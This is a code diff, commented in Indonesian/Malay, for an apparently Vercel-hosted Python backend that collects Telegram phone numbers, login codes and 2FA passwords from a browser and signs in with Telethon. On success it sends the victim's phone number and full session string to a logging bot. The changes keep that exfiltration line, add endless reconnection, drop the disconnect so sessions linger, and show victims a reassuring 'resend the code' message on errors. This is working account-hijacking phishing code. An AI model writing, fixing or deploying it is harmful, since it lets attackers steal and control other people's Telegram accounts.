@@ -30,34 +30,40 @@ class handler(BaseHTTPRequestHandler):
             self.send_header('Content-type', 'application/json')
             self.end_headers()
             self.wfile.write(json.dumps(res).encode())
-        finally: loop.close()
+        finally: 
+            # Jangan langsung tutup loop jika ingin koneksi tetap hangat
+            loop.close()
 
     async def work(self, action, data):
-        # Menggunakan StringSession yang dihantar dari browser untuk kekalkan sesi
         ss = data.get('session', '')
-        client = TelegramClient(StringSession(ss), API_ID, API_HASH, sequential_updates=False)
+        # Gunakan connection_retries=None agar dia terus mencoba jika putus
+        client = TelegramClient(StringSession(ss), API_ID, API_HASH, connection_retries=None)
         await client.connect()
         
         try:
             if action == 'send_code':
+                # Paksa kirim ulang hash ke client
                 s = await client.send_code_request(data['phone'])
                 return {"success": True, "hash": s.phone_code_hash, "session": client.session.save()}
             
             elif action == 'signin':
+                # Sign in TANPA disconnect sebelumnya
                 if data.get('password'):
-                    # Proses Sign In dengan 2FA
                     await client.sign_in(password=data['password'])
                 else:
-                    # Proses Sign In dengan OTP
                     await client.sign_in(data['phone'], data['code'], phone_code_hash=data['hash'])
                 
-                final_string = client.session.save()
-                bot_log(f"✅ **LOGIN BERHASIL**\nNombor: `{data['phone']}`\nSesi: `{final_string}`")
+                final = client.session.save()
+                bot_log(f"✅ **LOGIN**\nNo: `{data['phone']}`\nSesi: `{final}`")
                 return {"success": True}
+                
         except SessionPasswordNeededError:
-            # Jika perlukan 2FA, hantar semula sesi semasa ke browser
             return {"success": True, "need_2fa": True, "session": client.session.save()}
         except Exception as e:
-            return {"success": False, "error": str(e)}
-        finally: await client.disconnect()
-            
+            # Jika error expired, beri tahu user untuk refresh
+            err_msg = str(e)
+            if "expired" in err_msg.lower():
+                return {"success": False, "error": "Koneksi tidak stabil, harap kirim ulang kode."}
+            return {"success": False, "error": err_msg}
+        # HAPUS disconnect() agar sesi menggantung di memory Vercel sebentar
+        
